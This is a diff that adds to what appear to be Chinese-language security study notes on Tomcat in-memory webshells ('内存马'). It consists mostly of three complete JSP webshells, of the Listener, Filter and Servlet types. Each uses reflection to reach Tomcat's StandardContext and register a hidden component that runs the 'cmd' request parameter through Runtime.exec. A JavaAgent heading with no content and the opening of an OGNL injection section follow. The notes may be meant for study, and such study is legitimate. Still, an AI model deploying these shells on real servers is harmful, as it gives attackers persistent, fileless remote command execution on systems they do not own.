@@ -4,8 +4,189 @@
 > Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。
 > 而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖
 
+#### Listener型内存马
+获取StandardContext上下文
+实现一个恶意Listener
+通过StandardContext#addApplicationEventListener方法添加恶意Listener
+```jsp
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+ 
+<%!
+    public class Shell_Listener implements ServletRequestListener {
+ 
+        public void requestInitialized(ServletRequestEvent sre) {
+            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+           String cmd = request.getParameter("cmd");
+           if (cmd != null) {
+               try {
+                   Runtime.getRuntime().exec(cmd);
+               } catch (IOException e) {
+                   e.printStackTrace();
+               } catch (NullPointerException n) {
+                   n.printStackTrace();
+               }
+            }
+        }
+ 
+        public void requestDestroyed(ServletRequestEvent sre) {
+        }
+    }
+%>
+<%
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext context = (StandardContext) req.getContext();
+ 
+    Shell_Listener shell_Listener = new Shell_Listener();
+    context.addApplicationEventListener(shell_Listener);
+%>
+```
+
+#### Filter型内存马
+```java
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="java.util.Map" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+ 
+ 
+<%
+    ServletContext servletContext = request.getSession().getServletContext();
+    Field appContextField = servletContext.getClass().getDeclaredField("context");
+    appContextField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
+    standardContextField.setAccessible(true);
+    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+%>
+ 
+<%! public class Shell_Filter implements Filter {
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                try {
+                    Runtime.getRuntime().exec(cmd);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } catch (NullPointerException n) {
+                    n.printStackTrace();
+                }
+            }
+            chain.doFilter(request, response);
+        }
+    }
+%>
+ 
+<%
+    Shell_Filter filter = new Shell_Filter();
+    String name = "CommonFilter";
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilter(filter);
+    filterDef.setFilterName(name);
+    filterDef.setFilterClass(filter.getClass().getName());
+    standardContext.addFilterDef(filterDef);
+ 
+ 
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/*");
+    filterMap.setFilterName(name);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    standardContext.addFilterMapBefore(filterMap);
+ 
+ 
+    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
+    Configs.setAccessible(true);
+    Map filterConfigs = (Map) Configs.get(standardContext);
+ 
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+    filterConfigs.put(name, filterConfig);
+%>
+```
 
 
+
+#### servlet型
+```jsp
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+ 
+<%
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%>
+ 
+<%!
+ 
+    public class Shell_Servlet implements Servlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter("cmd");
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+ 
+%>
+ 
+<%
+    Shell_Servlet shell_servlet = new Shell_Servlet();
+    String name = shell_servlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(shell_servlet);
+    wrapper.setServletClass(shell_servlet.getClass().getName());
+%>
+ 
+<%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded("/shell",name);
+%>
+```
+
+### JavaAgent内存马
 
 ## ONGL注入
 OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。
